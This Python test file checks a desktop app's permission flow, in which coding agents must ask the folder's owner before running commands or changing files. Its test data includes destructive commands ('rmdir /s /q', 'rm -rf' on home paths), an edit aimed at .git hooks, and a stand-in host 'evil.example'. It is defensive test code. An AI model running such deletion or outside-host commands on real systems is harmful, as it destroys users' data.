"""Asking in the chat (step 3b of docs/research/agent-collab.md; the drivers'
``ask``, runner.py ``_ChatTurn``'s asks, ``POST /api/local-agents/chat/
turns/{turn}/asks/{ask}``, the PATCH's ``agent_runs``): against the
stand-ins (tests/fake_agents/) through the real processes, on the sample
paper as a work folder of this computer (test_local_agents_runner's
fixtures).

What a vault's agent may run is the computer's word (the shell's, to let it
ask; the maker's alone to stop it), ``never`` until then, and forgotten
with the agent turned off or changed, the vault relinked or removed. The
drivers start differently with ``ask`` (Claude Code's own flags and the
control protocol, Codex's approval policy and reviewer, checked), relay
what their agent asks and write the answers in the protocols' shapes; a
stop declines what waits, silence while an ask waits is no idleness. In
the chat an ask is a card in the agent's message until it is answered:
allowed once, allowed in this chat (the same command next answered by
itself, never another), declined with a note (Codex's steer, Claude Code's
message), declined by Gamma when nobody answers, withdrawn by the agent,
taken away by a Stop; the time it waits is not the turn's. Claude Code is
denied every tool but Bash without asking, a write to a protected path
first. Only the vault's maker answers, once; a Send never asks. An ask
shows its command exactly as given and the folder's and the home's paths
short only where they end; a grant is the command in its directory to its
host; set back to never, what waits and what comes is declined; Codex's
input to a running terminal and a change to a protected part are declined
unasked, its diffs name each change and are cut at a line; Claude Code's
ask turn runs each command in the folder. What an ask shows is marked where
it would not show, a wrapper's inner command read out of it only on an
exact round trip; Claude Code runs an allowed command with its command,
description and timeout alone, in the foreground; Gamma's declines are
worded as Gamma's; a file change asking for a root is declined unseen; a
turn holds 20 asks at most and asks no more after three declines in a row.
Asking on this computer is test_remote_asks.py's."""

import threading
import time
from types import SimpleNamespace

import pytest

from conftest import account_of, fresh_client, login, make_user, token_for
from fake_agents import ARGV, read_log, requests_in, script_agent
from gamma import workspaces
from gamma.db import connect_pages_db
from gamma.local_agents import chats, claude, codex, events, procs, prompt, runner, store
from gamma.routers import folder_links as folder_links_api
from gamma.vault import store as vault_store
from test_local_agents_chat import _chat, _reply, _say, _stop
from test_local_agents_routes import SHELL, _links, _patch
from test_local_agents_runner import (_folder, _request, _send, _until,  # noqa: F401: the disk fixture
                                      disk)

OWNER, EDITOR = "laas_owner", "laas_editor"
BUILD = "latexmk -pdf main.tex"


@pytest.fixture(scope="module")
def lab(client):
    """A shared workspace of laas_owner's that laas_editor edits."""
    for name in (OWNER, EDITOR):
        make_user(name, f"pw-{name}")
    owner, editor = login(OWNER, f"pw-{OWNER}"), login(EDITOR, f"pw-{EDITOR}")
    ws = workspaces.create("Agents asks", account_of(OWNER), kind="shared")["id"]
    workspaces.set_member(ws, account_of(EDITOR), "editor", by=account_of(OWNER))
    for c in (owner, editor):
        c.headers["X-Gamma-Workspace"] = ws
    return SimpleNamespace(ws=ws, owner=owner, editor=editor, user=account_of(OWNER))


def _asking(lab, disk, agent="codex"):
    """The paper as a vault whose agent may ask."""
    f = _folder(lab, disk, agent=agent)
    store.set_runs(f.id, "ask", by=lab.user)
    return f


def _answer(who, turn_id, ask_id, status=200, **body) -> dict:
    r = who.post(f"/api/local-agents/chat/turns/{turn_id}/asks/{ask_id}", json=body)
    assert r.status_code == status, r.text
    return r.json()


def _waiting(lab, page) -> dict:
    """The agent's last message once it asks."""
    return _until(lambda: (reply := _reply(lab, page)).get("asks") and reply)


def _answers(log) -> list[dict]:
    """What the stand-in read in answer to its asks, in order."""
    return [entry["answer"] for entry in read_log(log) if "answer" in entry]


def _steers(log) -> list[str]:
    return [m["params"]["input"][0]["text"] for m in requests_in(log) if m.get("method") == "turn/steer"]


# --- what the agent may run ----------------------------------------------------------------------

def test_what_the_agent_may_run_is_the_computers_word(lab, disk, monkeypatch):
    f = _folder(lab, disk, agent="")
    monkeypatch.setenv("GAMMA_SHELL_SECRET", "the-secret")
    assert _patch(lab.editor, f.id, 403, SHELL, agent_runs="ask")["detail"] == folder_links_api.MAKER_ONLY
    assert _patch(lab.owner, f.id, 400, SHELL, agent_runs="ask")["detail"] == "Turn an agent on first."
    store.set_agent(f.id, "codex", by=lab.user)
    assert _patch(lab.owner, f.id, 400, SHELL, agent_runs="always")["detail"] == (
        "What an agent may run is never, ask or computer.")
    assert _patch(lab.owner, f.id, 403, agent_runs="ask")["detail"] == (
        "Only the desktop app may let an agent ask to run commands in this folder.")
    assert store.runs_of(f.id) == "never" and _links(lab.owner)[f.id]["agent"]["runs"] == "never"

    on = _patch(lab.owner, f.id, 200, SHELL, agent_runs="ask")
    assert on["agent"]["runs"] == "ask" and store.runs_of(f.id) == "ask"
    assert lab.owner.get(f"/api/folder-links/page/{f.page}").json()["vault"]["agent"]["runs"] == "ask"
    assert _patch(lab.owner, f.id, 200, agent_runs="never")["agent"]["runs"] == "never"  # the maker's alone
    # turning it on with the agent, in one PATCH; changing the agent forgets it
    both = _patch(lab.owner, f.id, 200, SHELL, agent="claude", agent_runs="ask")
    assert (both["agent"]["name"], both["agent"]["runs"]) == ("claude", "ask")
    store.grant("cvOne", BUILD, link_id=f.id)
    _patch(lab.owner, f.id, 200, SHELL, agent="codex")
    assert store.runs_of(f.id) == "never" and not store.granted("cvOne", BUILD, link_id=f.id)
    monkeypatch.setenv("GAMMA_LOCAL_AGENTS", "0")
    assert _patch(lab.owner, f.id, 404, agent_runs="never")["detail"] == "Agents run on the desktop app's own server."


def test_consent_goes_with_the_agent_the_directory_and_the_vault(lab, disk):
    f = _asking(lab, disk)

    def given():
        store.set_runs(f.id, "ask", by=lab.user)
        store.grant("cvOne", BUILD, link_id=f.id)

    def kept():
        return store.runs_of(f.id) == "ask", store.granted("cvOne", f"  {BUILD}\n", link_id=f.id)

    given()
    assert kept() == (True, True)
    assert not store.granted("cvOne", f"{BUILD} -f", link_id=f.id)  # never a prefix
    store.set_agent(f.id, "codex", by=lab.user)  # the same agent again keeps it
    assert kept() == (True, True)
    store.forget_conversation("cvOne")
    assert kept() == (True, False)
    for forget in (lambda: store.set_runs(f.id, "never", by=lab.user), lambda: store.set_agent(f.id, "", by=""),
                   lambda: store.forget_threads(f.id), lambda: store.forget_links(set()),
                   lambda: vault_store.forget_link(f.id)):
        store.set_agent(f.id, "codex", by=lab.user)
        given()
        forget()
        assert kept() == (False, False)
    with pytest.raises(ValueError):
        store.set_runs(f.id, "always", by=lab.user)


# --- the drivers ---------------------------------------------------------------------------------

@pytest.fixture
def work(tmp_path, monkeypatch):
    monkeypatch.setattr(codex, "CHECK_SANDBOX", False)
    monkeypatch.setattr(events, "STOP_GRACE_S", 1.0)
    folder = tmp_path / "work"
    folder.mkdir()
    (folder / "main.tex").write_text("a\n", encoding="utf-8")
    yield SimpleNamespace(root=folder, log=tmp_path / "agent.log")
    left = list(procs._live)
    procs.stop_all(timeout=1)
    assert not left, f"children left running: {[c.proc.pid for c in left]}"


def _reading(turn) -> list[dict]:
    """The turn's events, read on a thread of their own as they come."""
    got: list[dict] = []
    threading.Thread(target=lambda: got.extend(turn.events()), daemon=True).start()
    return got


def _ended(got) -> dict:
    return _until(lambda: got and got[-1]["type"] == "done" and got[-1], 30)


def _chat_prompt(message="Build it."):
    return prompt.build_chat(agent="codex", owner="tim", work_folder="paper", file="main.pdf", message=message,
                             selections=[], ask=True)


def test_the_drivers_start_differently_with_ask(work, monkeypatch):
    assert claude.command(["claude"]) == ["claude"] + claude.FLAGS
    assert claude.command(["claude"], ask=True, session="5e55-s") == ["claude", "-p", "--input-format", "stream-json",
        "--output-format", "stream-json", "--verbose", "--restricted", "--permission-mode", "acceptEdits",
        "--permission-prompt-tool", "stdio", "--strict-mcp-config", "--tools", "Read,Edit,Write,Glob,Grep,Bash",
        "--disallowedTools", "WebFetch,WebSearch", "--settings", '{"permissions":{"ask":["Bash"]}}',
        "--resume", "5e55-s"]

    script_agent(monkeypatch, work.log)
    for ask in (False, True):
        out = list(events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=ask)
                   .events())
        assert out[-1]["ok"]
    started = [m["params"] for m in requests_in(work.log) if m.get("method") == "thread/start"]
    assert started[0]["approvalPolicy"] == "never" and "approvalsReviewer" not in started[0]
    assert (started[1]["approvalPolicy"], started[1]["approvalsReviewer"]) == ("on-request", "user")
    assert started[1]["sandbox"] == "workspace-write" and started[1]["config"] == started[0]["config"]
    # a thread whose approvals would go elsewhere than to the person is refused
    script_agent(monkeypatch, work.log, fail="reviewer")
    out = list(events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
               .events())
    assert out[-1] == events.done(ok=False, error="Codex did not take Gamma's way of asking you.")


def test_codex_relays_what_it_asks(work, monkeypatch):
    monkeypatch.setattr(events, "TURN_IDLE_S", 1.5)  # an ask that waits longer is no idleness
    script_agent(monkeypatch, work.log, ask=[
        {"command": BUILD, "reason": "To fetch a package.", "host": "ctan.org"},
        {"path": "../outside.tex", "diff": "@@ -1 +1 @@\n-a\n+b\n"},
        {"command": "make", "withdraw": 0.5}])
    turn = events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    first = _until(lambda: next((e for e in got if e["type"] == "ask"), None))
    assert first == {"type": "ask", "id": "100", "kind": "command", "step": "ap0", "command": BUILD, "cwd": ".",
                     "host": "ctan.org", "reason": "To fetch a package."}   # the host its own field alone
    time.sleep(2.5)
    assert turn.answer("100", "deny", "Use the copy in the folder.") and not turn.answer("100", "once")
    files = _until(lambda: next((e for e in got if e["type"] == "ask" and e["kind"] == "files"), None))
    outside = str((work.root.parent / "outside.tex").resolve())
    assert files == {"type": "ask", "id": "101", "kind": "files", "step": "ap1:0", "paths": [outside],
                     "diff": f"--- a/{outside}\n+++ b/{outside}\n@@ -1 +1 @@\n-a\n+b\n"}
    assert turn.answer("101", "chat")
    gone = _until(lambda: next((e for e in got if e["type"] == "ask_gone"), None))
    assert gone == {"type": "ask_gone", "id": "102"} and not turn.answer("102", "once")
    done = _ended(got)
    assert done["ok"] and done["text"] == "Did not run it."
    # the answers echo the request's id as it was (an int), in the schema's words; a note follows as a steer
    assert [(a["id"], a["result"]) for a in _answers(work.log)] == [
        (100, {"decision": "decline"}), (101, {"decision": "acceptForSession"})]
    steer = next(m["params"] for m in requests_in(work.log) if m.get("method") == "turn/steer")
    assert steer == {"threadId": "019a0000-fake-thread", "expectedTurnId": "019a0000-fake-turn",
                     "input": [{"type": "text", "text": "The owner declined that: Use the copy in the folder."}]}
    with pytest.raises(ValueError):
        turn.answer("100", "always")


def test_codex_stopped_while_it_asks_cancels(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"command": BUILD}])
    turn = events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    _until(lambda: any(e["type"] == "ask" for e in got))
    turn.stop()
    assert _ended(got) == events.done(ok=False, stopped=True, usage=got[-1]["usage"])
    assert [a["result"] for a in _answers(work.log)] == [{"decision": "cancel"}]
    assert not turn.answer("100", "once")


def test_claude_speaks_the_control_protocol_with_ask(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"edit": ".git/config"}, {"tool": "WebFetch"},
                                             {"command": "rm x", "blocked": ".git/hooks/pre-commit"},
                                             {"command": BUILD, "description": "Build the PDF"}])
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    asked = _until(lambda: next((e for e in got if e["type"] == "ask"), None))
    assert asked == {"type": "ask", "id": "req-3", "kind": "command", "step": "toolu_ask3", "command": BUILD,
                     "cwd": ".", "reason": "Build the PDF"}
    assert turn.answer("req-3", "once")
    done = _ended(got)
    assert done["ok"] and done["text"] == "Ran it."
    # what Gamma denied itself, never asked, is a failed step
    steps = [(e["id"], e["kind"], e["status"]) for e in got if e["type"] == "tool" and e["id"].startswith("toolu_ask")]
    assert steps == [("toolu_ask0", "edit", "started"), ("toolu_ask0", "edit", "failed"),
                     ("toolu_ask1", "other", "started"), ("toolu_ask1", "other", "failed"),
                     ("toolu_ask2", "run", "started"), ("toolu_ask2", "run", "failed"),
                     ("toolu_ask3", "run", "started"), ("toolu_ask3", "run", "completed")]
    assert [a["response"] for a in _answers(work.log)] == [
        {"subtype": "success", "request_id": "req-0",
         "response": {"behavior": "deny", "message": claude.CHANGE_REFUSED, "toolUseID": "toolu_ask0"}},
        {"subtype": "success", "request_id": "req-1",
         "response": {"behavior": "deny", "message": claude.TOOL_REFUSED, "toolUseID": "toolu_ask1"}},
        {"subtype": "success", "request_id": "req-2",
         "response": {"behavior": "deny", "message": claude.CHANGE_REFUSED, "toolUseID": "toolu_ask2"}},
        {"subtype": "success", "request_id": "req-3",
         "response": {"behavior": "allow", "updatedInput": {"command": BUILD, "description": "Build the PDF"},
                      "toolUseID": "toolu_ask3"}}]
    entries = read_log(work.log)
    assert entries[0]["argv"] == claude.ASK_FLAGS
    lines = [e["in"] for e in entries if "in" in e]
    assert lines[0] == {"type": "control_request", "request_id": "gamma-init", "request": {"subtype": "initialize"}}
    assert lines[1] == {"type": "user", "session_id": "", "parent_tool_use_id": None, "client_composed": True,
                        "message": {"role": "user", "content": [{"type": "text", "text": _chat_prompt()}]}}


def test_claude_declines_with_the_note_and_a_stop_interrupts(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"command": BUILD}])
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    _until(lambda: any(e["type"] == "ask" for e in got))
    assert turn.answer("req-0", "deny", "Use make.")
    assert _ended(got)["text"] == "Did not run it."
    assert _answers(work.log)[0]["response"]["response"] == {
        "behavior": "deny", "message": "The owner declined: Use make.", "toolUseID": "toolu_ask0"}

    work.log.unlink()
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    _until(lambda: any(e["type"] == "ask" for e in got))
    turn.stop()
    assert _ended(got) == events.done(ok=False, stopped=True, usage=got[-1]["usage"])
    assert _answers(work.log)[0]["response"]["response"] == {
        "behavior": "deny", "message": claude.STOPPED, "toolUseID": "toolu_ask0"}
    lines = [e["in"] for e in read_log(work.log) if "in" in e]
    assert {"type": "control_request", "request_id": "gamma-stop", "request": {"subtype": "interrupt"}} in lines


# --- in the chat: Codex --------------------------------------------------------------------------------

def test_a_command_asked_allowed_once_and_its_wait_is_not_the_turns(lab, disk, monkeypatch):
    monkeypatch.setenv("GAMMA_AGENT_RUN_TIMEOUT", "2")
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD, "reason": "To see the change."}])
    made = _say(lab.owner, f.page, "Rebuild the PDF.")
    turn_id = made["turn"]["id"]
    reply = _waiting(lab, f.page)
    [card] = reply["asks"]
    assert card == {"id": card["id"], "kind": "command", "command": BUILD, "cwd": ".", "reason": "To see the change.",
                    "at": card["at"], "expires_at": card["expires_at"]} and card["at"] < card["expires_at"]
    assert reply["state"] == "running"
    assert reply["steps"] == [{"id": "ap0", "kind": "run", "status": "asked", "program": "latexmk"}]
    told = next(m["params"] for m in requests_in(disk.log) if m.get("method") == "turn/start")["input"][0]["text"]
    assert "a command that needs more (the network, a file outside this directory) asks" in told
    time.sleep(3)  # longer than the turn may run: the wait is the person's
    assert _answer(lab.owner, turn_id, card["id"], decision="once") == {"answered": True}
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["text"], reply["asks"]) == ("done", "Ran it.", [])
    assert reply["steps"] == [{"id": "ap0", "kind": "run", "status": "completed", "program": "latexmk"}]
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "accept"}]
    assert not store.granted(made["conversation"]["id"], BUILD, link_id=f.id)
    assert _answer(lab.owner, turn_id, card["id"], 409, decision="once")["detail"] == "This turn has ended."


def test_allowed_in_this_chat_answers_the_same_command_alone(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    made = _say(lab.owner, f.page, "Rebuild.")
    conversation = made["conversation"]["id"]
    [card] = _waiting(lab, f.page)["asks"]
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="chat")
    _answer(lab.owner, made["turn"]["id"], card["id"], 409, decision="once")  # waits no more, or the turn ended
    assert runner.wait_idle(60)
    assert store.granted(conversation, BUILD, link_id=f.id)

    # the same command again: answered by itself, never shown
    _say(lab.owner, f.page, "Rebuild again.")
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["text"], reply["asks"]) == ("done", "Ran it.", [])
    assert all(s["status"] != "asked" for s in reply["steps"])
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "acceptForSession"}, {"decision": "accept"}]

    # another command (the same with other arguments) asks again; declined with a note, it is steered
    script_agent(monkeypatch, disk.log, ask=[{"command": f"{BUILD} -shell-escape"}])
    made = _say(lab.owner, f.page, "Rebuild with shell escape.")
    [card] = _waiting(lab, f.page)["asks"]
    assert card["command"] == f"{BUILD} -shell-escape"
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny", note="  Not with shell escape.  ")
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["text"], reply["steps"]) == (
        "Did not run it.", [{"id": "ap0", "kind": "run", "status": "declined", "program": "latexmk"}])
    assert _steers(disk.log) == ["The owner declined that: Not with shell escape."]

    # the composer's chip reads the grant from the strip and takes it back: the command asks again
    assert _chat(lab.owner, f.page)["computer"]["grants"] == [{"command": BUILD, "cwd": ".", "host": ""}]
    assert lab.editor.delete(f"/api/local-agents/chat/grants/{conversation}").status_code == 404
    r = lab.owner.delete(f"/api/local-agents/chat/grants/{conversation}")
    assert r.status_code == 200 and r.json() == {"forgotten": True}
    assert _chat(lab.owner, f.page)["computer"]["grants"] == []
    assert not store.granted(conversation, BUILD, link_id=f.id)


def test_a_file_change_asked_with_its_diff(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    diff = "@@ -1 +1 @@\n-\\title{A}\n+\\title{B}\n"
    script_agent(monkeypatch, disk.log, ask=[{"path": "main.tex", "diff": diff, "reason": "Outside its sandbox."}])
    made = _say(lab.owner, f.page, "Change the title.")
    reply = _waiting(lab, f.page)
    [card] = reply["asks"]
    assert {k: card[k] for k in ("kind", "paths", "diff", "reason")} == {
        "kind": "files", "paths": ["main.tex"], "diff": f"--- a/main.tex\n+++ b/main.tex\n{diff}",
        "reason": "Outside its sandbox."}
    assert "command" not in card and "cwd" not in card
    assert reply["steps"] == [{"id": "ap0:0", "kind": "edit", "status": "asked", "path": "main.tex"}]
    turn_id = made["turn"]["id"]
    assert _answer(lab.owner, turn_id, card["id"], 400, decision="chat")["detail"] == (
        "Only a command can be allowed in this chat.")
    _answer(lab.owner, turn_id, card["id"], decision="once")
    assert runner.wait_idle(60)
    assert _reply(lab, f.page)["steps"] == [{"id": "ap0:0", "kind": "edit", "status": "completed", "path": "main.tex"}]


def test_an_ask_nobody_answers_is_declined(lab, disk, monkeypatch):
    monkeypatch.setattr(runner, "ASK_TIMEOUT_S", 0.5)
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    _say(lab.owner, f.page, "Rebuild.")
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["text"], reply["asks"]) == ("done", "Did not run it.", [])
    assert reply["steps"][0]["status"] == "declined"
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "decline"}]
    assert _steers(disk.log) == ["Gamma declined that: No answer within 10 minutes."]   # Gamma's, not the owner's


def test_a_declined_step_reads_declined_though_the_agent_says_so_first(lab, disk, monkeypatch):
    """Codex's own word on a command it was refused (item/completed, declined: a failed step)
    heard before the answer's call returns: the step still reads declined."""
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    said = threading.Event()
    heard, answer = runner._ChatTurn._heard, events.Turn.answer

    def hearing(self, event):
        out = heard(self, event)
        if event.get("type") == "tool" and event.get("id") == "ap0" and event.get("status") != "started":
            said.set()
        return out

    def answering(self, *args, **kwargs):
        written = answer(self, *args, **kwargs)
        assert said.wait(30)
        return written

    monkeypatch.setattr(runner._ChatTurn, "_heard", hearing)
    monkeypatch.setattr(events.Turn, "answer", answering)
    made = _say(lab.owner, f.page, "Rebuild.")
    [card] = _waiting(lab, f.page)["asks"]
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny", note="No.")
    assert runner.wait_idle(60)
    assert _reply(lab, f.page)["steps"] == [{"id": "ap0", "kind": "run", "status": "declined", "program": "latexmk"}]


def test_a_decline_and_its_words_reach_codex_though_the_turn_ends_on_it(lab, disk, monkeypatch):
    """Codex ending its turn as soon as it reads a decline, before anything more could be
    written: the words went with the decline, which was answered, not 'no longer waits'."""
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    send = procs.Child.send

    def sending(self, text):
        written = send(self, text)
        if '"decision": "decline"' in text:
            _until(lambda: self.proc.poll() is not None)  # the turn ended and its process went
        return written

    monkeypatch.setattr(procs.Child, "send", sending)
    made = _say(lab.owner, f.page, "Rebuild.")
    [card] = _waiting(lab, f.page)["asks"]
    assert _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny", note="No.") == {"answered": True}
    assert runner.wait_idle(60)
    assert _reply(lab, f.page)["steps"] == [{"id": "ap0", "kind": "run", "status": "declined", "program": "latexmk"}]
    assert _steers(disk.log) == ["The owner declined that: No."]


def test_a_stop_while_it_asks_and_who_may_answer(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    made = _say(lab.owner, f.page, "Rebuild.")
    turn_id = made["turn"]["id"]
    [card] = _waiting(lab, f.page)["asks"]
    # only the vault's maker, a session, answers
    assert _answer(lab.editor, turn_id, card["id"], 404, decision="once")["detail"] == "No conversation has that id."
    script = fresh_client()
    script.headers.update({"Authorization": f"Bearer {token_for(lab.owner, 'write', 'Script')}",
                           "X-Gamma-Workspace": lab.ws})
    assert _answer(script, turn_id, card["id"], 403, decision="once")
    assert _answer(lab.owner, "noSuchTurn", card["id"], 404, decision="once")["detail"] == "No turn has that id."
    assert _answer(lab.owner, turn_id, "noSuchAsk", 404, decision="once")["detail"] == (
        "No question of this turn has that id.")
    assert _answer(lab.owner, turn_id, card["id"], 400, decision="always")["detail"] == "Answer once, chat or deny."
    assert _answer(lab.owner, turn_id, card["id"], 400, decision="deny", note="n" * 2001)["detail"] == (
        "A note is at most 2000 characters.")
    assert _reply(lab, f.page)["asks"] == [card]  # none of them answered it

    assert _stop(lab.owner, turn_id) == {"stopped": True}
    assert runner.wait_idle(30)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["asks"], reply["steps"][0]["status"]) == ("stopped", [], "declined")
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "cancel"}]
    assert _answer(lab.owner, turn_id, card["id"], 409, decision="once")["detail"] == "This turn has ended."


def test_a_folder_that_does_not_ask_and_a_send_never_ask(lab, disk, monkeypatch):
    f = _folder(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    _say(lab.owner, f.page, "Rebuild.")  # never: as in 3a
    assert runner.wait_idle(60)
    assert _reply(lab, f.page)["text"] == "Done: Rebuild."
    store.set_runs(f.id, "ask", by=lab.user)
    sent = _send(lab.owner, f)
    assert runner.wait_idle(60)
    assert _request(lab, sent["id"])["state"] == "done"
    started = [m["params"] for m in requests_in(disk.log) if m.get("method") == "thread/start"]
    assert all(p["approvalPolicy"] == "never" and "approvalsReviewer" not in p for p in started)
    assert not _answers(disk.log)


# --- in the chat: Claude Code ----------------------------------------------------------------------------

def test_claude_code_asks_to_run_a_command_and_nothing_else(lab, disk, monkeypatch):
    f = _asking(lab, disk, agent="claude")
    script_agent(monkeypatch, disk.log, ask=[{"edit": ".git/hooks/pre-commit"}, {"tool": "WebFetch"},
                                             {"command": BUILD, "description": "Build the PDF"}])
    made = _say(lab.owner, f.page, "Rebuild the PDF.")
    reply = _waiting(lab, f.page)
    [card] = reply["asks"]
    assert {k: card[k] for k in ("kind", "command", "cwd", "reason")} == {
        "kind": "command", "command": BUILD, "cwd": ".", "reason": "Build the PDF"}
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="chat")
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["text"]) == ("done", "Ran it.")
    asked = [s for s in reply["steps"] if s["id"].startswith("toolu_ask")]
    assert asked == [{"id": "toolu_ask0", "kind": "edit", "status": "failed", "path": ".git/hooks/pre-commit"},
                     {"id": "toolu_ask1", "kind": "other", "status": "failed"},
                     {"id": "toolu_ask2", "kind": "run", "status": "completed", "program": "latexmk"}]
    assert [a["response"]["response"]["behavior"] for a in _answers(disk.log)] == ["deny", "deny", "allow"]
    entries = read_log(disk.log)
    assert [e["argv"] for e in entries if "-p" in (e.get("argv") or [])][-1] == claude.ASK_FLAGS + [claude.STREAM_FLAG]
    told =[e["stdin"] for e in entries if "stdin" in e][-1]
    assert "use Bash: each command is asked of" in told and "You cannot run commands" not in told

    # allowed in this chat: the next turn's same command is answered alone; another is asked, then declined
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}, {"command": "make clean"}])
    made = _say(lab.owner, f.page, "Again, and clean.")
    [card] = _waiting(lab, f.page)["asks"]
    assert card["command"] == "make clean"
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny", note="Keep the files.")
    assert runner.wait_idle(60)
    assert _reply(lab, f.page)["text"] == "Did not run it."
    assert [a["response"]["response"] for a in _answers(disk.log)][-2:] == [
        {"behavior": "allow", "updatedInput": {"command": BUILD, "description": ""}, "toolUseID": "toolu_ask0"},
        {"behavior": "deny", "message": "The owner declined: Keep the files.", "toolUseID": "toolu_ask1"}]


def test_claude_code_stopped_while_it_asks_is_interrupted(lab, disk, monkeypatch):
    f = _asking(lab, disk, agent="claude")
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
    made = _say(lab.owner, f.page, "Rebuild.")
    _waiting(lab, f.page)
    assert _stop(lab.owner, made["turn"]["id"]) == {"stopped": True}
    assert runner.wait_idle(30)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["asks"]) == ("stopped", [])
    lines = [e["in"] for e in read_log(disk.log) if "in" in e]
    assert {"type": "control_request", "request_id": "gamma-stop", "request": {"subtype": "interrupt"}} in lines
    assert _answers(disk.log)[0]["response"]["response"]["message"] == claude.STOPPED
    assert _chat(lab.owner, f.page)["computer"]["turn"] is None
    with connect_pages_db(lab.ws) as conn:
        assert chats.busy(chats.active(conn, f.page, lab.user)) is None


# --- what an ask shows, what a grant covers, what Gamma answers itself ----------------------------------

def test_an_ask_shows_its_command_as_given_and_paths_short_only_where_they_end():
    win, home = r"C:\Users\Tim\Documents\paper", r"C:\Users\Tim"

    def rel(text):
        return runner._relative(text, win, home)

    assert rel(rf"{win}\sections\a.tex and C:/Users/Tim/Documents/paper/main.tex") == r"sections\a.tex and main.tex"
    assert (rel(win), rel(f'cd "{win}" && make'), rel(f"({win})")) == (".", 'cd "." && make', "(.)")
    # a sibling named after the folder, another user named after this one: never inside a longer name
    assert rel(rf"rmdir /s /q {win}-old") == r"rmdir /s /q ~/Documents\paper-old"
    assert rel(rf"copy {win}.bak\a.tex .") == r"copy ~/Documents\paper.bak\a.tex ."
    assert rel(r"C:\Users\Timothy\work and C:/Users/Tim2/x") == r"C:\Users\Timothy\work and C:/Users/Tim2/x"
    assert runner._redact(r"cannot read C:\Users\Timothy\secret.txt", win, home) == (
        "cannot read a file outside the folder")
    posix, posix_home = "/home/tim/paper", "/home/tim"
    assert runner._relative("rm -rf /home/tim/paper-old '/home/tim/paper/main.tex' /home/tim", posix,
                            posix_home) == "rm -rf ~/paper-old 'main.tex' ~"
    assert runner._relative("/home/timothy/notes /data/home/tim/paper/x", posix, posix_home) == (
        "/home/timothy/notes /data/home/tim/paper/x")
    assert runner._redact("open /home/timothy/x failed", posix, posix_home) == (
        "open a file outside the folder failed")


def _next_card(lab, page, seen: set) -> dict:
    """The next ask the agent's message shows, one not in ``seen``."""
    card = _until(lambda: next((a for a in _reply(lab, page).get("asks") or [] if a["id"] not in seen), None))
    seen.add(card["id"])
    return card


def test_allowed_in_this_chat_is_the_command_in_its_directory_to_its_host(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    odd = f'rmdir /s /q "{f.root}-old" && type "{f.root / "main.tex"}"'
    script_agent(monkeypatch, disk.log, ask=[{"command": odd, "host": "ctan.org"}])
    made = _say(lab.owner, f.page, "Clean up.")
    conversation, seen = made["conversation"]["id"], set()
    card = _next_card(lab, f.page, seen)
    # the command exactly as the agent gave it; the host a field of its own
    assert {k: card[k] for k in ("command", "cwd", "host")} == {"command": odd, "cwd": ".", "host": "ctan.org"}
    assert "reason" not in card
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="chat")
    assert runner.wait_idle(60)
    assert store.granted(conversation, odd, link_id=f.id, cwd=".", host="ctan.org")
    assert not store.granted(conversation, odd, link_id=f.id)

    # the same command in another directory, to another host, to none: asked again; the same three: answered alone
    script_agent(monkeypatch, disk.log, ask=[{"command": odd, "host": "ctan.org", "cwd": "sections"},
                                             {"command": odd, "host": "evil.example"}, {"command": odd},
                                             {"command": odd, "host": "ctan.org"}])
    made = _say(lab.owner, f.page, "Again.")
    shown = []
    for decision in ("once", "once", "deny"):
        card = _next_card(lab, f.page, seen)
        shown.append((card["cwd"], card.get("host")))
        _answer(lab.owner, made["turn"]["id"], card["id"], decision=decision)
    assert shown == [("sections", "ctan.org"), (".", "evil.example"), (".", None)]
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    assert (reply["state"], reply["text"], reply["asks"]) == ("done", "Ran it.", [])
